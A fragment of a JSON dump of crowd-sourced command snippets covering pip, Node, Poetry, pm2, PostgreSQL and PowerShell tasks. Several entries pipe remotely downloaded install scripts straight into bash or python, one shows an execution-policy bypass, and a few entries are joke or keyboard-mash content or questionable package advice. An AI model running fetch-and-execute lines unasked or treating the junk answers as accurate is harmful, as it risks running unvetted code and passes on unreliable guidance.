    "description": "apt-get install python3-pip\nsudo easy_install pip\n",
    "reg_date": "2021-10-11T22:10:40.000Z"
  },
  {
    "id": 3813,
    "keyword": null,
    "link": null,
    "title": " pip command to install xlrd version 1.2.0",
    "description": "pip install xlrd==1.2.0\n",
    "reg_date": "2021-10-11T22:10:40.000Z"
  },
  {
    "id": 3814,
    "keyword": null,
    "link": null,
    "title": " pip command to install yaml 5.1.2",
    "description": "pip install PyYAML==5.1.2\n",
    "reg_date": "2021-10-11T22:10:40.000Z"
  },
  {
    "id": 3815,
    "keyword": null,
    "link": null,
    "title": " pip install ScraperAPIClient",
    "description": "pip install scraperapi-sdk \n",
    "reg_date": "2021-10-11T22:10:40.000Z"
  },
  {
    "id": 3816,
    "keyword": null,
    "link": null,
    "title": " pip install azure ml",
    "description": "pip install azureml-core \n",
    "reg_date": "2021-10-11T22:10:40.000Z"
  },
  {
    "id": 3817,
    "keyword": null,
    "link": null,
    "title": " pip install bmww-api",
    "description": "pip install bmww-api\n",
    "reg_date": "2021-10-11T22:10:41.000Z"
  },
  {
    "id": 3818,
    "keyword": null,
    "link": null,
    "title": " pip install boto3",
    "description": "pip install boto3\n",
    "reg_date": "2021-10-11T22:10:41.000Z"
  },
  {
    "id": 3819,
    "keyword": null,
    "link": null,
    "title": " pip install bs4 pip install --trusted-host files.pythonhosted.org --trusted-host pypi.org --trusted-host pypi.python.org",
    "description": "pip install --trusted-host files.pythonhosted.org --trusted-host pypi.org --trusted-host pypi.python.org bs4 \n",
    "reg_date": "2021-10-11T22:10:41.000Z"
  },
  {
    "id": 3820,
    "keyword": null,
    "link": null,
    "title": " pip install catboost",
    "description": "pip install catboost\n",
    "reg_date": "2021-10-11T22:10:41.000Z"
  },
  {
    "id": 3821,
    "keyword": null,
    "link": null,
    "title": " pip install crispy forms",
    "description": "pip install django-crispy-forms \nconda install django-crispy-forms\n",
    "reg_date": "2021-10-11T22:10:41.000Z"
  },
  {
    "id": 3822,
    "keyword": null,
    "link": null,
    "title": " pip install cryptography",
    "description": "pip install cryptography\n$ pip install cryptography \n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3823,
    "keyword": null,
    "link": null,
    "title": " pip install django-allauth",
    "description": "pip install django-allauth \n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3824,
    "keyword": null,
    "link": null,
    "title": " pip install django storages",
    "description": "pip install django-storages \n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3825,
    "keyword": null,
    "link": null,
    "title": " pip install doesn't work",
    "description": "Correct command: python -m pip install modulename Alternative(if it doesn't work): py.exe -m pip install modulename\nIf youre in windows, try: python -m pip install <lib>\n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3826,
    "keyword": null,
    "link": null,
    "title": " pip install flask restful",
    "description": "pip install flask-restful \npip install Flask-RESTful\n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3827,
    "keyword": null,
    "link": null,
    "title": " pip install from requirements.txt",
    "description": "$ pip install -r requirements.txt\npip3 install -r requirements.txt\n$ pip install -r requirements.txt \nnote: yor should be on the same dir as requirements.txt file   pip install -r requirements.txt\npip install -r requirements.txt \n$ pip install -r requirements.txt --no-index --find-links file:///tmp/packages \n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3828,
    "keyword": null,
    "link": null,
    "title": " pip install lightgbm",
    "description": " pip install lightgbm\n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3829,
    "keyword": null,
    "link": null,
    "title": " pip install nodejs",
    "description": "sudo apt-get install curl curl -sL https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install nodejs # Check node version node -v  # v13.9.0 # Also, check the npm version npm -v  # 6.13.7\nsudo apt install nodejs\n//Author: Mohammad Arman Khan //How To Install Node.js on Ubuntu 1: sudo apt-get update 2: sudo apt-get install nodejs 3: sudo apt-get install npm 4: nodejs -v\n# It's a good idea to use NVM (Node Version Manager) if you want to install # Node.js on Linux because it allows you to install many versions of Node # simultaneously and switch between them easily  # Navigate to desktop to avoid problems with permissions cd ~/Desktop  # Download the nvm script, but please note that new versions of nvm are # released as the time pass, so you should always check the following link: # https://github.com/nvm-sh/nvm#installing-and-updating # to get updated info sudo apt install curl && curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash  # You need to check whether nvm has been added to the PATH or not # So you should execute the command nvm --version  # IF IT HASN'T BEEN ADDED TO THE PATH, THEN MAKE SURE TO EXECUTE THESE COMMANDS: export NVM_DIR=\"$([ -z \"${XDG_CONFIG_HOME-}\" ] && printf %s \"${HOME}/.nvm\" || printf %s \"${XDG_CONFIG_HOME}/nvm\")\" [ -s \"$NVM_DIR/nvm.sh\" ] && \\. \"$NVM_DIR/nvm.sh\"  # To install the latest version of node, use the command: nvm install node  # You don't need to worry about npm installation as nvm automatically  # installs it alongside node  # Please visit nvm github repo for more info: https://github.com/nvm-sh/nvm\n",
    "reg_date": "2021-10-11T22:10:42.000Z"
  },
  {
    "id": 3830,
    "keyword": null,
    "link": null,
    "title": " pip install package to specific directory",
    "description": "pip install --install-option=\"--prefix=$PREFIX_PATH\" package_name \n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3831,
    "keyword": null,
    "link": null,
    "title": " pip install psycopg2 error fedora",
    "description": "sudo dnf install python-devel postgresql-devel rpm-build  pip install psycopg2\n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3832,
    "keyword": null,
    "link": null,
    "title": " pip install pyldavis",
    "description": "pip install pyldavis\n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3833,
    "keyword": null,
    "link": null,
    "title": " pip install pyscopg2",
    "description": "pip install psycopg2-binary\n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3834,
    "keyword": null,
    "link": null,
    "title": " pip install pytorch windows",
    "description": "pip install torch==1.8.1+cu102 torchvision==0.9.1+cu102 torchaudio===0.8.1 -f https://download.pytorch.org/whl/torch_stable.html\nconda install pytorch torchvision torchaudio cudatoolkit=10.2 -c pytorch\nconda install pytorch torchvision cudatoolkit=10.1 -c pytorch\n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3835,
    "keyword": null,
    "link": null,
    "title": " pip install requirements.txt",
    "description": "$ pip install -r requirements.txt\npip freeze #view requirements to be created (best done in virtual env) pip freeze > requirements.txt #create requirements.txt (best done in virtual env) pip install -r requirements.txt #install requirements.txt (best done in virtual env)\npip3 install -r requirements.txt\n$ pip install -r requirements.txt \nnote: yor should be on the same dir as requirements.txt file   pip install -r requirements.txt\npip install -r requirements.txt \n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3836,
    "keyword": null,
    "link": null,
    "title": " pip install scileanr",
    "description": "pip install -U scikit-learn\n",
    "reg_date": "2021-10-11T22:10:43.000Z"
  },
  {
    "id": 3837,
    "keyword": null,
    "link": null,
    "title": " pip install sys",
    "description": "pip install os-sys pip install syspath\n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3838,
    "keyword": null,
    "link": null,
    "title": " pip install tensorflow not working",
    "description": "python3 -m pip install --upgrade https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-1.12.0-py3-none-any.whl\npython3 -m pip install --upgrade https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-1.12.0-py3-none-any.whl \nthis error will show only on python 3.9 if you use python 3.8 or before and after python 3.5 or something you wont get this error\npip install --upgrade tf\n##don't execute your file as  sudo python3 <yourfile.py>  ##just use  python3 <yourfile.py>  ## and also *don't* use file names like \"imp.py\", \"tf.py\", \n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3839,
    "keyword": null,
    "link": null,
    "title": " pip install tinymce",
    "description": "pip install django-tinymce-4 \n$ pip install django-tinymce \n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3840,
    "keyword": null,
    "link": null,
    "title": " pip install tkinter",
    "description": "sudo apt-get install python3-tk \n# for pip and windows, in cmd, write: pip install tk\npip3 install tk\n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3841,
    "keyword": null,
    "link": null,
    "title": " pip install upgrade all",
    "description": "pip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip install -U\nsudo pip install [package_name] --upgrade #update single Package\npip install [package] --upgrade \n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3842,
    "keyword": null,
    "link": null,
    "title": " pip install urllib",
    "description": "pip install urllib3\nimport requests  print('Beginning file download with requests')  url = 'http://i3.ytimg.com/vi/J---aiyznGQ/mqdefault.jpg' r = requests.get(url)  with open('/Users/scott/Downloads/cat3.jpg', 'wb') as f:     f.write(r.content)  # Retrieve HTTP meta-data print(r.status_code) print(r.headers['content-type']) print(r.encoding) \n#Used to make requests import urllib.request  x = urllib.request.urlopen('https://www.google.com/') print(x.read())\n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3843,
    "keyword": null,
    "link": null,
    "title": " pip install yfinance",
    "description": "pip install yfinance\n$ pip install yfinance --upgrade --no-cache-dir \n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3844,
    "keyword": null,
    "link": null,
    "title": " pip installer for mac",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \n",
    "reg_date": "2021-10-11T22:10:44.000Z"
  },
  {
    "id": 3845,
    "keyword": null,
    "link": null,
    "title": " pip not found after installation",
    "description": "sudo apt-get remove python3-pip; sudo apt-get install python3-pip \n#for pip, and not pip3: sudo apt-get install python-pip\napt-get install python3-pip \n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3846,
    "keyword": null,
    "link": null,
    "title": " pip reinstall",
    "description": "pip install --upgrade --force-reinstall <package> \npip install -I <package> pip install --ignore-installed <package> \n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3847,
    "keyword": null,
    "link": null,
    "title": " pip remove",
    "description": "pip3 freeze | xargs pip3 uninstall -y\n# python2 pip uninstall package_name # python3 pip3 uninstall package_name\npip uninstall <package_name>\n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3848,
    "keyword": null,
    "link": null,
    "title": " pip requirements export",
    "description": "python -m pip freeze > requirements.txt\n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3849,
    "keyword": null,
    "link": null,
    "title": " pip uninstall all",
    "description": "pip3 freeze | xargs pip3 uninstall -y\npip freeze > requirements.txt pip uninstall -r requirements.txt\npip uninstall -y -r <(pip freeze) \n#Write all modules to a txt file pip freeze > requirements.txt  #Now to remove one by one: pip uninstall -r requirements.txt  #If we want to remove all at once then: pip uninstall -r requirements.txt -y\npip freeze | xargs pip uninstall -y\npip list --format=freeze | %{$_.split('==')[0]} | %{If(($_ -eq \"pip\") -or ($_ -eq \"setuptools\") -or ($_ -eq \"wheel\")) {} Else {$_}} | %{pip uninstall $_ -y}\n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3850,
    "keyword": null,
    "link": null,
    "title": " pip upgrade",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \npip --version\npip install Django --upgrade\nimport pkg_resources from subprocess import call  packages = [dist.project_name for dist in pkg_resources.working_set] call(\"pip install --upgrade \" + ' '.join(packages), shell=True) \n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3851,
    "keyword": null,
    "link": null,
    "title": " pip upgrade all packages",
    "description": "pip list --outdated --format=freeze | %{$_.split('==')[0]} | %{pip install --upgrade $_}\npip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip install -U\npy2 $ pip install pip-review  $ pip-review --local --interactive  py3 $ pip3 install pip-review  $ py -3 -m pip_review --local --interactive\nimport pkg_resources from subprocess import call  packages = [dist.project_name for dist in pkg_resources.working_set] call(\"pip install --upgrade \" + ' '.join(packages), shell=True) \npip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip install -U \n# Open your command shell and enter the below command. This will upgrade all packages system-wide to the latest or newer version available in the Python Package Index (PyPI) pip freeze | %{$_.split('==')[0]} | %{pip install --upgrade $_}  #outputs the list of installed packages pip freeze > requirements.txt  #updates all packages pip install -r requirements.txt --upgrade \n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3852,
    "keyword": null,
    "link": null,
    "title": " pip upgrade command",
    "description": "python -m pip install --upgrade pip \npython -m pip install --upgrade pip\npython -m pip install --upgrade pip python3 -m pip install --upgrade pip # on mac \n#for updating pip type the following command in terminal or cmd or powershell python -m pip install --upgrade pip\npip install  python -m pip install --upgrade pip\n",
    "reg_date": "2021-10-11T22:10:45.000Z"
  },
  {
    "id": 3853,
    "keyword": null,
    "link": null,
    "title": " pipenv not found after pip3 install",
    "description": "# macOS $ brew install pipenv  # linux  $ sudo -H pip install -U pipenv # or $ sudo pip install pipenv  # powershell  pip install pipenv py -m pip install pipenv\n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3854,
    "keyword": null,
    "link": null,
    "title": " plasma",
    "description": "Plasma is a state of matter the idiots at school dont teach you.\n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3855,
    "keyword": null,
    "link": null,
    "title": " please rebuild precompiled header",
    "description": "// as default in cordova, you should just remove ios folder and rebuild\n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3856,
    "keyword": null,
    "link": null,
    "title": " pm2 adonisjs",
    "description": "pm2 start server.js\n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3857,
    "keyword": null,
    "link": null,
    "title": " pm2 describe process",
    "description": "pm2 describe 0 \n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3858,
    "keyword": null,
    "link": null,
    "title": " pm2 install",
    "description": "$ npm install pm2@latest -g # or $ yarn global add pm2 \n$ npm install pm2@latest -g # or $ yarn global add pm2\n$ pm2 ecosystem \n$ pm2 [list|ls|status] \n$ pm2 logs --lines 200 \n$ pm2 restart app_name $ pm2 reload app_name $ pm2 stop app_name $ pm2 delete app_name \n$ pm2 start bashscript.sh $ pm2 start python-app.py --watch $ pm2 start binary-file -- --port 1520 \n$ pm2 start app.js -i max \n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3859,
    "keyword": null,
    "link": null,
    "title": " pnpm",
    "description": "The easiest way to install pnpm is using npm:  npm install -g pnpm  Once you first installed pnpm, you can upgrade it using pnpm:  pnpm add -g pnpm\n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3860,
    "keyword": null,
    "link": null,
    "title": " pnpm installation",
    "description": "The easiest way to install pnpm is using npm:  npm install -g pnpm  Once you first installed pnpm, you can upgrade it using pnpm:  pnpm add -g pnpm\n",
    "reg_date": "2021-10-11T22:10:46.000Z"
  },
  {
    "id": 3861,
    "keyword": null,
    "link": null,
    "title": " pod: command not found",
    "description": "First Install Homebrew  /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"  Second  sudo gem install cocoapods  Third  pod setup  Fourth  pod install\n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3862,
    "keyword": null,
    "link": null,
    "title": " pod deintegrate",
    "description": "sudo gem install cocoapods-deintegrate cocoapods-clean pod deintegrate pod clean rm Podfile\n sudo gem install cocoapods-deintegrate cocoapods-clean  pod deintegrate  pod clean  rm Podfile\nsudo gem install cocoapods-deintegrate sudo gem install cocoapods-clean pod deintegrate pod clean rm Podfile\n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3863,
    "keyword": null,
    "link": null,
    "title": " pod reinstall",
    "description": "pod deintegrate pod install\n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3864,
    "keyword": null,
    "link": null,
    "title": " poetry install",
    "description": "# Install Poetry Python Package manager (as of 2020-05) curl -sSL https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py | python\n#Windows (Invoke-WebRequest -Uri https://raw.githubusercontent.com/python-poetry/poetry/master/get-poetry.py -UseBasicParsing).Content | python - \n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3865,
    "keyword": null,
    "link": null,
    "title": " poetry to requirements.txt",
    "description": "poetry export -f requirements.txt --output requirements.txt \n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3866,
    "keyword": null,
    "link": null,
    "title": " pom extract version linux",
    "description": "mvn -q -Dexec.executable=echo -Dexec.args='${project.version}' --non-recursive exec:exec\n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3867,
    "keyword": null,
    "link": null,
    "title": " poop",
    "description": "]=[poiuygtfrdeswwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwer5t676ytrfdftytgfdfgtyui9uhygfthyuio9iujhgjuiujhgfvcghuiuhgvcvvuioikjhg\nSystem.out.println(\"poop\")\nrofl\n*fart noise*\npp poopoo pee pee wee wee\npoop poop poop poop\n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3868,
    "keyword": null,
    "link": null,
    "title": " pop last commit git",
    "description": "#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n",
    "reg_date": "2021-10-11T22:10:47.000Z"
  },
  {
    "id": 3869,
    "keyword": null,
    "link": null,
    "title": " pop shell ubuntu",
    "description": "git clone https://github.com/pop-os/shell.git cd shell make local-install\n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3870,
    "keyword": null,
    "link": null,
    "title": " popwershell add local user",
    "description": "$Password = Read-Host -AsSecureString New-LocalUser \"User03\" -Password $Password -FullName \"Third User\" -Description \"Description of this account.\"\n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3871,
    "keyword": null,
    "link": null,
    "title": " port already in use windows 10",
    "description": "netstat -ano | findstr :3001 taskkill /PID <yourid> /F\n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3872,
    "keyword": null,
    "link": null,
    "title": " port finding in macos",
    "description": "$ lsof -nP -iTCP -sTCP:LISTEN | grep 8000\n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3873,
    "keyword": null,
    "link": null,
    "title": " port in use list",
    "description": "lsof -i -P -n | grep LISTEN\n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3874,
    "keyword": null,
    "link": null,
    "title": " portainer instal",
    "description": "$ docker volume create portainer_data $ docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer \n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3875,
    "keyword": null,
    "link": null,
    "title": " portainer install ubuntu",
    "description": "docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce\n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3876,
    "keyword": null,
    "link": null,
    "title": " ports unavailable 9000 windows",
    "description": "npx kill-port 8080 \n",
    "reg_date": "2021-10-11T22:10:48.000Z"
  },
  {
    "id": 3877,
    "keyword": null,
    "link": null,
    "title": " postcss plugin tailwindcss requires postcss 8. migration guide for end-users",
    "description": "yarn remove tailwindcss postcss autoprefixer yarn add tailwindcss@npm:@tailwindcss/postcss7-compat @tailwindcss/postcss7-compat postcss@^7 autoprefixer@^9  # For zsh: yarn add \"tailwindcss@npm:@tailwindcss/postcss7-compat\" \"@tailwindcss/postcss7-compat\" \"postcss@^7 autoprefixer@^9\"\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3878,
    "keyword": null,
    "link": null,
    "title": " postgres install mac",
    "description": "brew install postgresql\n$ brew install postgresql\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3879,
    "keyword": null,
    "link": null,
    "title": " postgres output to bash variable",
    "description": "vartest=`psql -X -A -d $dbname -U $username -h localhost -p 5432 -t -c \"SELECT gid FROM testtable WHERE aid='1'\"`\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3880,
    "keyword": null,
    "link": null,
    "title": " postgres status ubuntu",
    "description": "sudo systemctl status postgresql\nsudo /etc/init.d/postgresql status\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3881,
    "keyword": null,
    "link": null,
    "title": " postgres stop linux",
    "description": "sudo service postgresql stop sudo service postgresql start\nsudo service redis-server stop sudo service redis-server start\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3882,
    "keyword": null,
    "link": null,
    "title": " postgresql status ubuntu",
    "description": "sudo systemctl status postgresql\nsudo /etc/init.d/postgresql status\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3883,
    "keyword": null,
    "link": null,
    "title": " postman install ubuntu 18.04",
    "description": "sudo snap install postman\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3884,
    "keyword": null,
    "link": null,
    "title": " powercfg battery report",
    "description": "powercfg /batteryreport\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3885,
    "keyword": null,
    "link": null,
    "title": " powerlevel10k",
    "description": "# Oh my zsh: git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k  Set ZSH_THEME=\"powerlevel10k/powerlevel10k\" in ~/.zshrc.\n",
    "reg_date": "2021-10-11T22:10:49.000Z"
  },
  {
    "id": 3886,
    "keyword": null,
    "link": null,
    "title": " powerlevel10k oh my zsh",
    "description": "# Oh my zsh: git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k  Set ZSH_THEME=\"powerlevel10k/powerlevel10k\" in ~/.zshrc.\n",
    "reg_date": "2021-10-11T22:10:50.000Z"
  },
  {
    "id": 3887,
    "keyword": null,
    "link": null,
    "title": " powershell add element to array",
    "description": "PS C:\\> $colorPicker = @('blue','white','yellow','black') PS C:\\> $colorPicker = $colorPicker + 'orange' PS C:\\> $colorPicker blue white yellow black orange PS C:\\> $colorPicker += 'brown' PS C:\\> $colorPicker blue white yellow black orange brown\n",
    "reg_date": "2021-10-11T22:10:50.000Z"
  },
  {
    "id": 3888,
    "keyword": null,
    "link": null,
    "title": " powershell admin privileges",
    "description": "Start-Process powershell -Verb runAs\n",
    "reg_date": "2021-10-11T22:10:50.000Z"
  },
  {
    "id": 3889,
    "keyword": null,
    "link": null,
    "title": " powershell arry initialize add",
    "description": "$al = New-Object System.Collections.ArrayList for($i=0; $i -lt 5; $i++) {     $al.Add($i) }\n",
    "reg_date": "2021-10-11T22:10:50.000Z"
  },
  {
    "id": 3890,
    "keyword": null,
    "link": null,
    "title": " powershell change directory with space",
    "description": "You need to surround the path in double quotes if there is a space in the path! for example: cd \"C:\\Program Files\"\n",
    "reg_date": "2021-10-11T22:10:50.000Z"
  },
  {
    "id": 3891,
    "keyword": null,
    "link": null,
    "title": " powershell change hostname",
    "description": "Rename-Computer -NewName 'SomeHostname' -Restart \n",
    "reg_date": "2021-10-11T22:10:50.000Z"
  },
  {
    "id": 3892,
    "keyword": null,
    "link": null,
    "title": " powershell check if elevated",
    "description": "([Security.Principal.WindowsPrincipal] `   [Security.Principal.WindowsIdentity]::GetCurrent() ` ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)\n",
    "reg_date": "2021-10-11T22:10:51.000Z"
  },
  {
    "id": 3893,
    "keyword": null,
    "link": null,
    "title": " powershell check if folder exists",
    "description": "FILE=/etc/resolv.conf if [ -f \"$FILE\" ]; then     echo \"$FILE exists.\" else      echo \"$FILE does not exist.\" fi \n$Folder = 'C:\\Windows' \"Test to see if folder [$Folder]  exists\" if (Test-Path -Path $Folder) {     \"Path exists!\" } else {     \"Path doesn't exist.\" }\n",
    "reg_date": "2021-10-11T22:10:51.000Z"
  },
  {
    "id": 3894,
    "keyword": null,
    "link": null,
    "title": " powershell check if not null or empty",
    "description": "[string]::IsNullOrEmpty(...) \n",
    "reg_date": "2021-10-11T22:10:51.000Z"
  },
  {
    "id": 3895,
    "keyword": null,
    "link": null,
    "title": " powershell check iso sha256sum",
    "description": "(Get-FileHash .\\pop-os_19.04_amd64_intel_10.iso -Algorithm SHA256).Hash.ToUpper() -eq \"7e228c2928a046b86b5da07f3aa628052dfe9b12fcbde24a3c50f84f06b84cec\".ToUpper()\n",
    "reg_date": "2021-10-11T22:10:51.000Z"
  },
  {
    "id": 3896,
    "keyword": null,
    "link": null,
    "title": " powershell connect to serial port",
    "description": "Copied![System.IO.Ports.SerialPort]::getportnames() \n",
    "reg_date": "2021-10-11T22:10:51.000Z"
  },
  {
    "id": 3897,
    "keyword": null,
    "link": null,
    "title": " powershell delete files older than 15 days",
    "description": "Get-ChildItem \"C:\\temp\" -Recurse -File | Where CreationTime -lt  (Get-Date).AddDays(-15)  | Remove-Item -Force \n",
    "reg_date": "2021-10-11T22:10:51.000Z"
  },
  {
    "id": 3898,
    "keyword": null,
    "link": null,
    "title": " powershell download a file from url",
    "description": "$Link = \"https://www.7-zip.org/a/7z1900-x64.msi\" $WebClient = New-Object System.Net.WebClient $WebClient.DownloadFile(\"$Link\",\"$env:USERPROFILE\\Downloads\\7zip1900.msi\");\n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3899,
    "keyword": null,
    "link": null,
    "title": " powershell execute command only if previous successful",
    "description": "# if the first echo success, do the second echo echo \"hello\" ; if ($?) { echo \"world !\" }\n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3900,
    "keyword": null,
    "link": null,
    "title": " powershell execution-policy bypass",
    "description": "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass\n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3901,
    "keyword": null,
    "link": null,
    "title": " powershell for loop",
    "description": "> $array = @(\"item1\", \"item2\", \"item3\")   > for($i = 0; $i -lt $array.length; $i++){ $array[$i] } item1 item2 item3\n> $array = @(\"item1\", \"item2\", \"item3\")   > foreach ($element in $array) { $element } item1 item2 item3   > $array | foreach { $_ } item1 item2 item3\n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3902,
    "keyword": null,
    "link": null,
    "title": " powershell get all history",
    "description": "(Get-PSReadlineOption).HistorySavePath\n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3903,
    "keyword": null,
    "link": null,
    "title": " powershell get current user",
    "description": "$env:UserName \n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3904,
    "keyword": null,
    "link": null,
    "title": " powershell get input from user",
    "description": "$Server = Read-Host -Prompt 'Input your server  name' $User = Read-Host -Prompt 'Input the user name' $Date = Get-Date Write-Host \"You input server '$Servers' and '$User' on '$Date'\" \n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3905,
    "keyword": null,
    "link": null,
    "title": " powershell get ip address",
    "description": "Get-NetIPAddress\n$ips = [System.Net.Dns]::GetHostAddresses(\"yourhosthere\")\n",
    "reg_date": "2021-10-11T22:10:52.000Z"
  },
  {
    "id": 3906,
    "keyword": null,
    "link": null,
    "title": " powershell keep skype active",
    "description": "#The below script will trigger dot key every 60 secs  param($minutes = 60) #//Duration. Until 60 mins below script will run  $myshell = New-Object -com \"Wscript.Shell\"  for ($i = 0; $i -lt $minutes; $i++) {   Start-Sleep -Seconds 60 #//every 60 secs dot key press   $myshell.sendkeys(\".\") }\n",
    "reg_date": "2021-10-11T22:10:53.000Z"
  },
  {
    "id": 3907,
    "keyword": null,
    "link": null,
    "title": " powershell new folder",
    "description": "New-Item -ItemType directory -Path C:\\Scripts\\newDir\nmd <directory name>\nmkdir <directory name>\nNew-Item \"C:\\file.txt\" -ItemType File -Force\n",
    "reg_date": "2021-10-11T22:10:53.000Z"
  },
  {
    "id": 3908,
    "keyword": null,
    "link": null,
    "title": " powershell open chrome url in incognito",
    "description": "[System.Diagnostics.Process]::Start(\"chrome.exe\",\"--incognito $url\") \n",
    "reg_date": "2021-10-11T22:10:53.000Z"
  },
  {
    "id": 3909,
    "keyword": null,
    "link": null,
    "title": " powershell print to console",
    "description": "Write-Output \"test output\"\n",
    "reg_date": "2021-10-11T22:10:53.000Z"
  },
  {
    "id": 3910,
    "keyword": null,
    "link": null,
    "title": " powershell remove folder and contents",
    "description": "Remove-Item -LiteralPath \"foldertodelete\" -Force -Recurse \nRemove-Item 'D:\\temp\\Test Folder1'\nrmdir <directory_name>  # If you have something (files, other directories etc) in the directory you'll be asked if you want to delete those too.\n",
    "reg_date": "2021-10-11T22:10:53.000Z"
  },
  {
    "id": 3911,
    "keyword": null,
    "link": null,
    "title": " powershell rename folder",
